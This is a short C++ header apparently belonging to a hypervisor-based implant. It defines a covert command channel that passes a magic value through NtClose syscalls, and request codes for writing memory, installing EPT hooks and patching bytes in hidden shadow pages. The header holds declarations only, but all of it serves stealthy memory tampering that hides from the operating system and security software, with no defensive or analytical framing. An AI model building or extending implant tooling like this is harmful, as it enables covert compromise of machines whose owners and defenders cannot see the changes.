#pragma once

extern "C" long long ntclose_syscall(unsigned long long handle, unsigned long long rdx);

constexpr unsigned long long NTCLOSE_MAGIC = 0xDEAD133700001337ULL;

constexpr unsigned int CMD_PING             = 0x01;
constexpr unsigned int CMD_WRITE_MEMORY     = 0x03;
constexpr unsigned int CMD_INSTALL_EPT_HOOK = 0x10;
constexpr unsigned int CMD_EPT_PATCH_BYTES  = 0x12;

struct ept_patch_bytes_params_t {
    unsigned int patch_offset;     // offset within the 4KB page
    unsigned int patch_size;       // number of bytes to patch (max 64)
    unsigned char patch_bytes[64]; // the actual bytes for the shadow page
};

struct implant_request_t {
    unsigned int command;
    unsigned int status;       // 0 = success
    unsigned long long param1;
    unsigned long long param2;
    unsigned long long param3;
    unsigned long long result;
};

namespace comms
{
    bool test_channel();
}
